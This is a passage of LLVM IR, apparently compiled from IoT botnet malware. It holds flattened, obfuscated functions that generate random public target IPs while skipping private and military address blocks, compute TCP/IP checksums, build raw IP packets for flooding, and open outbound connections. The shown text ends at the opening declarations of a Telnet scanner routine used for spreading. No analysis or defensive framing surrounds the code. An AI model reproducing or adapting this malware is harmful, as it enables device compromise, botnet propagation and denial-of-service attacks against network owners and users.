  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %56 = zext i8 %55 to i32
  %57 = icmp eq i32 %56, 168
  %58 = select i1 %57, i32 1010125045, i32 -1956995232
  store i32 %58, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %61 = zext i8 %60 to i32
  %62 = icmp eq i32 %61, 172
  %63 = select i1 %62, i32 -973677244, i32 1543773581
  store i32 %63, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %66 = zext i8 %65 to i32
  %67 = icmp sge i32 %66, 16
  %68 = select i1 %67, i32 857635743, i32 1543773581
  store i32 %68, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %71 = zext i8 %70 to i32
  %72 = icmp slt i32 %71, 32
  %73 = select i1 %72, i32 1010125045, i32 1543773581
  store i32 %73, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 100
  %78 = select i1 %77, i32 -679641391, i32 746250975
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %81 = zext i8 %80 to i32
  %82 = icmp sge i32 %81, 64
  %83 = select i1 %82, i32 842544984, i32 746250975
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %86 = zext i8 %85 to i32
  %87 = icmp slt i32 %86, 127
  %88 = select i1 %87, i32 1010125045, i32 746250975
  store i32 %88, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  %90 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %91 = zext i8 %90 to i32
  %92 = icmp eq i32 %91, 169
  %93 = select i1 %92, i32 -1385549260, i32 -1062653651
  store i32 %93, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %96 = zext i8 %95 to i32
  %97 = icmp sgt i32 %96, 254
  %98 = select i1 %97, i32 1010125045, i32 -1062653651
  store i32 %98, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %101 = zext i8 %100 to i32
  %102 = icmp eq i32 %101, 198
  %103 = select i1 %102, i32 1596713542, i32 -1233509079
  store i32 %103, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %106 = zext i8 %105 to i32
  %107 = icmp sge i32 %106, 18
  %108 = select i1 %107, i32 -449047235, i32 -1233509079
  store i32 %108, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  %110 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %111 = zext i8 %110 to i32
  %112 = icmp slt i32 %111, 20
  %113 = select i1 %112, i32 1010125045, i32 -1233509079
  store i32 %113, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %116 = zext i8 %115 to i32
  %117 = icmp eq i32 %116, 224
  %118 = select i1 %117, i32 1010125045, i32 1925633519
  store i32 %118, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  %120 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %121 = zext i8 %120 to i32
  %122 = icmp eq i32 %121, 6
  %123 = select i1 %122, i32 510631984, i32 -1613745128
  store i32 %123, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %126 = zext i8 %125 to i32
  %127 = icmp eq i32 %126, 7
  %128 = select i1 %127, i32 510631984, i32 -483465904
  store i32 %128, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %131 = zext i8 %130 to i32
  %132 = icmp eq i32 %131, 11
  %133 = select i1 %132, i32 510631984, i32 1024802597
  store i32 %133, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:134:                                    ; preds = %loopEntry
  %135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %136 = zext i8 %135 to i32
  %137 = icmp eq i32 %136, 21
  %138 = select i1 %137, i32 510631984, i32 2039766078
  store i32 %138, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %141 = zext i8 %140 to i32
  %142 = icmp eq i32 %141, 22
  %143 = select i1 %142, i32 510631984, i32 -1113616903
  store i32 %143, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:144:                                    ; preds = %loopEntry
  %145 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %146 = zext i8 %145 to i32
  %147 = icmp eq i32 %146, 26
  %148 = select i1 %147, i32 510631984, i32 1618904662
  store i32 %148, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:149:                                    ; preds = %loopEntry
  %150 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %151 = zext i8 %150 to i32
  %152 = icmp eq i32 %151, 28
  %153 = select i1 %152, i32 510631984, i32 920153208
  store i32 %153, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:154:                                    ; preds = %loopEntry
  %155 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %156 = zext i8 %155 to i32
  %157 = icmp eq i32 %156, 29
  %158 = select i1 %157, i32 510631984, i32 382712358
  store i32 %158, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:159:                                    ; preds = %loopEntry
  %160 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %161 = zext i8 %160 to i32
  %162 = icmp eq i32 %161, 30
  %163 = select i1 %162, i32 510631984, i32 1725604874
  store i32 %163, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %166 = zext i8 %165 to i32
  %167 = icmp eq i32 %166, 33
  %168 = select i1 %167, i32 510631984, i32 1723435488
  store i32 %168, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  %170 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %171 = zext i8 %170 to i32
  %172 = icmp eq i32 %171, 55
  %173 = select i1 %172, i32 510631984, i32 302904677
  store i32 %173, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:174:                                    ; preds = %loopEntry
  %175 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %176 = zext i8 %175 to i32
  %177 = icmp eq i32 %176, 214
  %178 = select i1 %177, i32 510631984, i32 -263718256
  store i32 %178, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:179:                                    ; preds = %loopEntry
  %180 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %181 = zext i8 %180 to i32
  %182 = icmp eq i32 %181, 215
  store i32 510631984, i32* %switchVar
  store i1 %182, i1* %.reg2mem
  br label %loopEnd

; <label>:183:                                    ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  store i32 1010125045, i32* %switchVar
  store i1 %.reload, i1* %.reg2mem2
  br label %loopEnd

; <label>:184:                                    ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %185 = select i1 %.reload3, i32 -847096394, i32 -61531965
  store i32 %185, i32* %switchVar
  br label %loopEnd

; <label>:186:                                    ; preds = %loopEntry
  %187 = call i32 @rand() #2
  %188 = srem i32 %187, 223
  %189 = trunc i32 %188 to i8
  store i8 %189, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %190 = call i32 @rand() #2
  %191 = srem i32 %190, 255
  %192 = trunc i32 %191 to i8
  store i8 %192, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %193 = call i32 @rand() #2
  %194 = srem i32 %193, 255
  %195 = trunc i32 %194 to i8
  store i8 %195, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 2), align 1
  %196 = call i32 @rand() #2
  %197 = srem i32 %196, 255
  %198 = trunc i32 %197 to i8
  store i8 %198, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 3), align 1
  store i32 1377781326, i32* %switchVar
  br label %loopEnd

; <label>:199:                                    ; preds = %loopEntry
  %200 = bitcast [16 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %200, i8 0, i64 16, i32 16, i1 false)
  %201 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %202 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %203 = zext i8 %202 to i32
  %204 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %205 = zext i8 %204 to i32
  %206 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 2), align 1
  %207 = zext i8 %206 to i32
  %208 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 3), align 1
  %209 = zext i8 %208 to i32
  %210 = call i32 (i8*, i8*, ...) @szprintf(i8* %201, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.136, i32 0, i32 0), i32 %203, i32 %205, i32 %207, i32 %209)
  %211 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %212 = call i32 @inet_addr(i8* %211) #2
  ret i32 %212

loopEnd:                                          ; preds = %186, %184, %183, %179, %174, %169, %164, %159, %154, %149, %144, %139, %134, %129, %124, %119, %114, %109, %104, %99, %94, %89, %84, %79, %74, %69, %64, %59, %54, %49, %44, %39, %34, %29, %24, %19, %14, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: noinline nounwind uwtable
define i32 @GetRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #13
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  %switchVar = alloca i32
  store i32 706804532, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 706804532, label %6
    i32 1518910658, label %10
    i32 -999311184, label %19
    i32 1084128122, label %23
    i32 -1131420023, label %30
    i32 -925000411, label %31
    i32 -1010153887, label %36
    i32 -194829133, label %42
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  %9 = select i1 %8, i32 1518910658, i32 -999311184
  store i32 %9, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i16*, i16** %3, align 8
  %12 = getelementptr inbounds i16, i16* %11, i32 1
  store i16* %12, i16** %3, align 8
  %13 = load i16, i16* %11, align 2
  %14 = zext i16 %13 to i64
  %15 = load i64, i64* %5, align 8
  %16 = add i64 %15, %14
  store i64 %16, i64* %5, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sub nsw i32 %17, 2
  store i32 %18, i32* %4, align 4
  store i32 706804532, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %4, align 4
  %21 = icmp sgt i32 %20, 0
  %22 = select i1 %21, i32 1084128122, i32 -1131420023
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i16*, i16** %3, align 8
  %25 = bitcast i16* %24 to i8*
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i64
  %28 = load i64, i64* %5, align 8
  %29 = add i64 %28, %27
  store i64 %29, i64* %5, align 8
  store i32 -1131420023, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  store i32 -925000411, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i64, i64* %5, align 8
  %33 = lshr i64 %32, 16
  %34 = icmp ne i64 %33, 0
  %35 = select i1 %34, i32 -1010153887, i32 -194829133
  store i32 %35, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i64, i64* %5, align 8
  %38 = and i64 %37, 65535
  %39 = load i64, i64* %5, align 8
  %40 = lshr i64 %39, 16
  %41 = add i64 %38, %40
  store i64 %41, i64* %5, align 8
  store i32 -925000411, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i64, i64* %5, align 8
  %44 = xor i64 %43, -1
  %45 = trunc i64 %44 to i16
  ret i16 %45

loopEnd:                                          ; preds = %36, %31, %30, %23, %19, %10, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #13
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #2
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #2
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  store i32 %4, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 596417031, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 596417031, label %first
    i32 806635017, label %7
    i32 955731435, label %8
    i32 -1256728016, label %11
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %5 = icmp sgt i32 3, %.reload
  %6 = select i1 %5, i32 806635017, i32 955731435
  store i32 %6, i32* %switchVar
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  store i32 1, i32* %2, align 4
  store i32 -1256728016, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %3, align 4
  %10 = call i32 @close(i32 %9)
  store i32 0, i32* %2, align 4
  store i32 -1256728016, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %2, align 4
  ret i32 %12

loopEnd:                                          ; preds = %8, %7, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %.reg2mem = alloca %struct.hostent*
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %.reg2mem
  %.reload2 = load volatile %struct.hostent*, %struct.hostent** %.reg2mem
  store %struct.hostent* %.reload2, %struct.hostent** %6, align 8
  %switchVar = alloca i32
  store i32 478195691, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 478195691, label %first
    i32 529966914, label %14
    i32 1845028403, label %15
    i32 639680811, label %38
    i32 977021754, label %39
    i32 1386521912, label %45
    i32 734322354, label %46
    i32 704923267, label %48
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile %struct.hostent*, %struct.hostent** %.reg2mem
  %12 = icmp eq %struct.hostent* %.reload, null
  %13 = select i1 %12, i32 529966914, i32 1845028403
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 704923267, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load %struct.hostent*, %struct.hostent** %6, align 8
  %17 = getelementptr inbounds %struct.hostent, %struct.hostent* %16, i32 0, i32 4
  %18 = load i8**, i8*** %17, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %22 = bitcast %struct.in_addr* %21 to i8*
  %23 = load %struct.hostent*, %struct.hostent** %6, align 8
  %24 = getelementptr inbounds %struct.hostent, %struct.hostent* %23, i32 0, i32 3
  %25 = load i32, i32* %24, align 4
  %26 = sext i32 %25 to i64
  call void @bcopy(i8* %20, i8* %22, i64 %26) #2
  %27 = load i16, i16* %5, align 2
  %28 = call zeroext i16 @htons(i16 zeroext %27) #13
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %28, i16* %29, align 2
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %30, align 4
  %31 = call i32 @socket(i32 2, i32 1, i32 6) #2
  store i32 %31, i32* %9, align 4
  %32 = load i32, i32* %9, align 4
  %33 = bitcast i32* %8 to i8*
  %34 = call i32 @setsockopt(i32 %32, i32 6, i32 1, i8* %33, i32 4) #2
  %35 = load i32, i32* %9, align 4
  %36 = icmp eq i32 %35, -1
  %37 = select i1 %36, i32 639680811, i32 977021754
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 704923267, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %9, align 4
  %41 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  %43 = icmp eq i32 %42, -1
  %44 = select i1 %43, i32 1386521912, i32 734322354
  store i32 %44, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 704923267, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %9, align 4
  store i32 %47, i32* %3, align 4
  store i32 704923267, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i32, i32* %3, align 4
  ret i32 %49

loopEnd:                                          ; preds = %46, %45, %39, %38, %15, %14, %first, %switchDefault
  br label %loopEntry
}

declare %struct.hostent* @gethostbyname(i8*) #3

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #4

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @TelnetScanner(i32, i32) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [128 x i8], align 16
  %10 = alloca i8, align 1
  %11 = alloca i32, align 4
  %12 = alloca %struct.__sigset_t, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
